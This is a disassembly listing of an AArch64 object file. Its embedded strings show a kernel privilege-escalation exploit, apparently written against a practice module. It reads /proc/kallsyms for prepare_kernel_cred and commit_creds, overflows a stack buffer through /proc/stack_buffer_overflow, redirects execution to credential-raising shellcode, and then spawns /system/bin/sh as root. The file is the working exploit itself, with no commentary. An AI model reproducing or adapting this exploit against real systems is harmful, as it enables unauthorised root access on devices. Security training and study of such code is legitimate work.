
commit_cred.o:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000000000 <get_ksymbol>:
   0:	d108c3ff 	sub	sp, sp, #0x230
   4:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
   8:	910003fd 	mov	x29, sp
   c:	910063a1 	add	x1, x29, #0x18
  10:	f9000020 	str	x0, [x1]
  14:	90000000 	adrp	x0, 0 <get_ksymbol>
  18:	91000002 	add	x2, x0, #0x0
  1c:	90000000 	adrp	x0, 0 <get_ksymbol>
  20:	91000001 	add	x1, x0, #0x0
  24:	aa0203e0 	mov	x0, x2
  28:	94000000 	bl	0 <fopen>
  2c:	f9011fa0 	str	x0, [x29,#568]
  30:	1400000a 	b	58 <get_ksymbol+0x58>
  34:	9100c3a0 	add	x0, x29, #0x30
  38:	910063a1 	add	x1, x29, #0x18
  3c:	f9400021 	ldr	x1, [x1]
  40:	94000000 	bl	0 <strcmp>
  44:	6b1f001f 	cmp	w0, wzr
  48:	54000081 	b.ne	58 <get_ksymbol+0x58>
  4c:	9100a3a0 	add	x0, x29, #0x28
  50:	f9400000 	ldr	x0, [x0]
  54:	1400000b 	b	80 <get_ksymbol+0x80>
  58:	90000000 	adrp	x0, 0 <get_ksymbol>
  5c:	91000001 	add	x1, x0, #0x0
  60:	9100a3a2 	add	x2, x29, #0x28
  64:	9108dfa3 	add	x3, x29, #0x237
  68:	9100c3a4 	add	x4, x29, #0x30
  6c:	f9411fa0 	ldr	x0, [x29,#568]
  70:	94000000 	bl	0 <fscanf>
  74:	6b1f001f 	cmp	w0, wzr
  78:	54fffdec 	b.gt	34 <get_ksymbol+0x34>
  7c:	d2800000 	mov	x0, #0x0                   	// #0
  80:	a8c17bfd 	ldp	x29, x30, [sp],#16
  84:	9108c3ff 	add	sp, sp, #0x230
  88:	d65f03c0 	ret

000000000000008c <open_file>:
  8c:	a9be7bfd 	stp	x29, x30, [sp,#-32]!
  90:	910003fd 	mov	x29, sp
  94:	90000000 	adrp	x0, 0 <get_ksymbol>
  98:	91000000 	add	x0, x0, #0x0
  9c:	52800041 	mov	w1, #0x2                   	// #2
  a0:	94000000 	bl	0 <open>
  a4:	b9001fa0 	str	w0, [x29,#28]
  a8:	b9401fa0 	ldr	w0, [x29,#28]
  ac:	3100041f 	cmn	w0, #0x1
  b0:	540000a1 	b.ne	c4 <open_file+0x38>
  b4:	90000000 	adrp	x0, 0 <get_ksymbol>
  b8:	91000001 	add	x1, x0, #0x0
  bc:	52800020 	mov	w0, #0x1                   	// #1
  c0:	94000000 	bl	0 <err>
  c4:	b9401fa0 	ldr	w0, [x29,#28]
  c8:	a8c27bfd 	ldp	x29, x30, [sp],#32
  cc:	d65f03c0 	ret

00000000000000d0 <payload>:
  d0:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
  d4:	910003fd 	mov	x29, sp
  d8:	94000000 	bl	0 <getuid>
  dc:	6b1f001f 	cmp	w0, wzr
  e0:	54000201 	b.ne	120 <payload+0x50>
  e4:	90000000 	adrp	x0, 0 <get_ksymbol>
  e8:	91000000 	add	x0, x0, #0x0
  ec:	94000000 	bl	0 <puts>
  f0:	90000000 	adrp	x0, 0 <get_ksymbol>
  f4:	91000004 	add	x4, x0, #0x0
  f8:	90000000 	adrp	x0, 0 <get_ksymbol>
  fc:	91000001 	add	x1, x0, #0x0
 100:	90000000 	adrp	x0, 0 <get_ksymbol>
 104:	91000002 	add	x2, x0, #0x0
 108:	90000000 	adrp	x0, 0 <get_ksymbol>
 10c:	91000003 	add	x3, x0, #0x0
 110:	aa0403e0 	mov	x0, x4
 114:	d2800004 	mov	x4, #0x0                   	// #0
 118:	94000000 	bl	0 <execl>
 11c:	14000004 	b	12c <payload+0x5c>
 120:	90000000 	adrp	x0, 0 <get_ksymbol>
 124:	91000000 	add	x0, x0, #0x0
 128:	94000000 	bl	0 <warnx>
 12c:	52800000 	mov	w0, #0x0                   	// #0
 130:	94000000 	bl	0 <_exit>
 134:	d503201f 	nop
 138:	d503201f 	nop
 13c:	d503201f 	nop

0000000000000140 <shellcode>:
 140:	58000b83 	ldr	x3, 2b0 <main+0x58>
 144:	d2800000 	mov	x0, #0x0                   	// #0
 148:	d63f0060 	blr	x3

000000000000014c <print_data>:
 14c:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
 150:	910003fd 	mov	x29, sp
 154:	90000000 	adrp	x0, 0 <get_ksymbol>
 158:	91000000 	add	x0, x0, #0x0
 15c:	94000000 	bl	0 <puts>
 160:	a8c17bfd 	ldp	x29, x30, [sp],#16
 164:	d65f03c0 	ret

0000000000000168 <trigger_vuln>:
 168:	a9b87bfd 	stp	x29, x30, [sp,#-128]!
 16c:	910003fd 	mov	x29, sp
 170:	b9001fa0 	str	w0, [x29,#28]
 174:	b9001ba1 	str	w1, [x29,#24]
 178:	9100a3a0 	add	x0, x29, #0x28
 17c:	52801fe1 	mov	w1, #0xff                  	// #255
 180:	d2800802 	mov	x2, #0x40                  	// #64
 184:	94000000 	bl	0 <memset>
 188:	9100a3a0 	add	x0, x29, #0x28
 18c:	91012000 	add	x0, x0, #0x48
 190:	f9003fa0 	str	x0, [x29,#120]
 194:	f9403fa0 	ldr	x0, [x29,#120]
 198:	90000001 	adrp	x1, 140 <shellcode>
 19c:	f9400021 	ldr	x1, [x1]
 1a0:	f9000001 	str	x1, [x0]
 1a4:	9100a3a1 	add	x1, x29, #0x28
 1a8:	b9401fa0 	ldr	w0, [x29,#28]
 1ac:	d2800a02 	mov	x2, #0x50                  	// #80
 1b0:	94000000 	bl	0 <write>
 1b4:	a8c87bfd 	ldp	x29, x30, [sp],#128
 1b8:	d65f03c0 	ret

00000000000001bc <resolve_kernel_symbols>:
 1bc:	a9bf7bfd 	stp	x29, x30, [sp,#-16]!
 1c0:	910003fd 	mov	x29, sp
 1c4:	90000000 	adrp	x0, 0 <get_ksymbol>
 1c8:	91000000 	add	x0, x0, #0x0
 1cc:	94000000 	bl	0 <get_ksymbol>
 1d0:	aa0003e1 	mov	x1, x0
 1d4:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 1d8:	f9400000 	ldr	x0, [x0]
 1dc:	f9000001 	str	x1, [x0]
 1e0:	90000000 	adrp	x0, 0 <get_ksymbol>
 1e4:	91000000 	add	x0, x0, #0x0
 1e8:	94000000 	bl	0 <get_ksymbol>
 1ec:	aa0003e1 	mov	x1, x0
 1f0:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 1f4:	f9400000 	ldr	x0, [x0]
 1f8:	f9000001 	str	x1, [x0]
 1fc:	90000000 	adrp	x0, 0 <get_ksymbol>
 200:	91000000 	add	x0, x0, #0x0
 204:	94000000 	bl	0 <get_ksymbol>
 208:	aa0003e1 	mov	x1, x0
 20c:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 210:	f9400000 	ldr	x0, [x0]
 214:	f9000001 	str	x1, [x0]
 218:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 21c:	f9400000 	ldr	x0, [x0]
 220:	f9400000 	ldr	x0, [x0]
 224:	eb1f001f 	cmp	x0, xzr
 228:	540000c0 	b.eq	240 <resolve_kernel_symbols+0x84>
 22c:	90000000 	adrp	x0, 8 <get_ksymbol+0x8>
 230:	f9400000 	ldr	x0, [x0]
 234:	f9400000 	ldr	x0, [x0]
 238:	eb1f001f 	cmp	x0, xzr
 23c:	540000a1 	b.ne	250 <resolve_kernel_symbols+0x94>
 240:	90000000 	adrp	x0, 0 <get_ksymbol>
 244:	91000001 	add	x1, x0, #0x0
 248:	52800020 	mov	w0, #0x1                   	// #1
 24c:	94000000 	bl	0 <errx>
 250:	a8c17bfd 	ldp	x29, x30, [sp],#16
 254:	d65f03c0 	ret

0000000000000258 <main>:
 258:	a9be7bfd 	stp	x29, x30, [sp,#-32]!
 25c:	910003fd 	mov	x29, sp
 260:	90000000 	adrp	x0, 0 <get_ksymbol>
 264:	91000002 	add	x2, x0, #0x0
 268:	90000000 	adrp	x0, d0 <payload>
 26c:	f9400001 	ldr	x1, [x0]
 270:	aa0203e0 	mov	x0, x2
 274:	94000000 	bl	0 <printf>
 278:	94000000 	bl	8c <open_file>
 27c:	b9001fa0 	str	w0, [x29,#28]
 280:	b9401fa0 	ldr	w0, [x29,#28]
 284:	b9401ba1 	ldr	w1, [x29,#24]
 288:	94000000 	bl	168 <trigger_vuln>
 28c:	94000000 	bl	d0 <payload>
 290:	b9401fa0 	ldr	w0, [x29,#28]
 294:	94000000 	bl	0 <close>
 298:	90000000 	adrp	x0, 0 <get_ksymbol>
 29c:	91000000 	add	x0, x0, #0x0
 2a0:	94000000 	bl	0 <errx>
 2a4:	a8c27bfd 	ldp	x29, x30, [sp],#32
 2a8:	d65f03c0 	ret
 2ac:	00000000 	.word	0x00000000
 2b0:	0825d734 	.word	0x0825d734
 2b4:	ffffff80 	.word	0xffffff80
 2b8:	d503201f 	nop
 2bc:	d503201f 	nop

Disassembly of section .rodata:

0000000000000000 <.rodata>:
   0:	6f72702f 	.word	0x6f72702f
   4:	616b2f63 	.word	0x616b2f63
   8:	79736c6c 	.word	0x79736c6c
   c:	0000736d 	.word	0x0000736d
  10:	00000072 	.word	0x00000072
  14:	00000000 	.word	0x00000000
  18:	25207025 	.word	0x25207025
  1c:	73252063 	.word	0x73252063
  20:	0000000a 	.word	0x0000000a
  24:	00000000 	.word	0x00000000
  28:	6f72702f 	.word	0x6f72702f
  2c:	74732f63 	.word	0x74732f63
  30:	5f6b6361 	.word	0x5f6b6361
  34:	66667562 	.word	0x66667562
  38:	6f5f7265 	.word	0x6f5f7265
  3c:	66726576 	.word	0x66726576
  40:	00776f6c 	.word	0x00776f6c
  44:	00000000 	.word	0x00000000
  48:	6e65706f 	.word	0x6e65706f
  4c:	00000000 	.word	0x00000000
  50:	205d2b5b 	.word	0x205d2b5b
  54:	6f6a6e65 	.word	0x6f6a6e65
  58:	68742079 	.word	0x68742079
  5c:	68732065 	.word	0x68732065
  60:	006c6c65 	.word	0x006c6c65
  64:	00000000 	.word	0x00000000
  68:	7379732f 	.word	0x7379732f
  6c:	2f6d6574 	.word	0x2f6d6574
  70:	2f6e6962 	.word	0x2f6e6962
  74:	00006873 	.word	0x00006873
  78:	0000632d 	.word	0x0000632d
	...
  88:	6c696166 	.word	0x6c696166
  8c:	74206465 	.word	0x74206465
  90:	6567206f 	.word	0x6567206f
  94:	6f722074 	.word	0x6f722074
  98:	202e746f 	.word	0x202e746f
  9c:	20776f48 	.word	0x20776f48
  a0:	20646964 	.word	0x20646964
  a4:	65206577 	.word	0x65206577
  a8:	206e6576 	.word	0x206e6576
  ac:	20746567 	.word	0x20746567
  b0:	65726568 	.word	0x65726568
  b4:	0000003f 	.word	0x0000003f
  b8:	6c6c6568 	.word	0x6c6c6568
  bc:	6f77206f 	.word	0x6f77206f
  c0:	00646c72 	.word	0x00646c72
  c4:	00000000 	.word	0x00000000
  c8:	70657270 	.word	0x70657270
  cc:	5f657261 	.word	0x5f657261
  d0:	6e72656b 	.word	0x6e72656b
  d4:	635f6c65 	.word	0x635f6c65
  d8:	00646572 	.word	0x00646572
  dc:	00000000 	.word	0x00000000
  e0:	6d6d6f63 	.word	0x6d6d6f63
  e4:	635f7469 	.word	0x635f7469
  e8:	73646572 	.word	0x73646572
  ec:	00000000 	.word	0x00000000
  f0:	636f7270 	.word	0x636f7270
  f4:	6c69665f 	.word	0x6c69665f
  f8:	72775f65 	.word	0x72775f65
  fc:	00657469 	.word	0x00657469
 100:	6c756f63 	.word	0x6c756f63
 104:	74276e64 	.word	0x74276e64
 108:	70616d20 	.word	0x70616d20
 10c:	6c6c6120 	.word	0x6c6c6120
 110:	72656b20 	.word	0x72656b20
 114:	206c656e 	.word	0x206c656e
 118:	626d7973 	.word	0x626d7973
 11c:	00736c6f 	.word	0x00736c6f
 120:	6c796170 	.word	0x6c796170
 124:	2064616f 	.word	0x2064616f
 128:	72646461 	.word	0x72646461
 12c:	786c2520 	.word	0x786c2520
 130:	0000000a 	.word	0x0000000a
 134:	00000000 	.word	0x00000000
 138:	205d2d5b 	.word	0x205d2d5b
 13c:	6c707865 	.word	0x6c707865
 140:	2074696f 	.word	0x2074696f
 144:	6c696166 	.word	0x6c696166
 148:	000a6465 	.word	0x000a6465
 14c:	00000000 	.word	0x00000000

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	43434700 	.inst	0x43434700 ; undefined
   4:	4728203a 	.inst	0x4728203a ; undefined
   8:	2029554e 	.inst	0x2029554e ; undefined
   c:	2e392e34 	uqsub	v20.8b, v17.8b, v25.8b
  10:	30322078 	adr	x24, 6441d <main+0x641c5>
  14:	31303531 	adds	w17, w9, #0xc0d
  18:	28203332 	stnp	w18, w12, [x25,#-256]
  1c:	72657270 	.inst	0x72657270 ; undefined
  20:	61656c65 	.inst	0x61656c65 ; undefined
  24:	00296573 	.inst	0x00296573 ; NYI
